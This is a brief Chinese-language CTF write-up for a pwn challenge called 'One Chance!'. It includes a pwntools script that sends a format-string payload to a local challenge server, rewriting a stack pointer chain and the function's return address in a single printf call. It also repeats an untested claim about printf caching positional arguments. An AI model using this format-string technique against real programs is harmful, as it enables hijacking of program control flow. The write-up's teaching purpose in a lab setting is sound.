# One Chance!

给了栈地址，那么就能算出vuln函数的返回地址。只需将修改地址链和修改返回地址放在一个payload里即可
```py
from pwn import *
p=remote("127.0.0.1","50333")
p.recvuntil(": ")
vuln_ret=int(p.recvline(keepends=False),16)-8
value=(vuln_ret&0xffff)-13
p.sendlineafter("!","%c"*13+f"%{value}c%hn%{0xffff-(vuln_ret&0xffff)+1+8}c%45$hhn")
p.interactive()
```
注意改地址链时不能使用数字参数（`%xx$hn`），据说这样做会导致printf缓存这个值，后续写`%45$hhn`时用的还是原本的值，而不是改好的那个地址。我是在[这里](https://eth007.me/blog/ctf/stiller-printf/)看到这个知识点的，不过不确定是不是真的，自己没实验过。前人栽树后人乘凉，不管树是不是真的（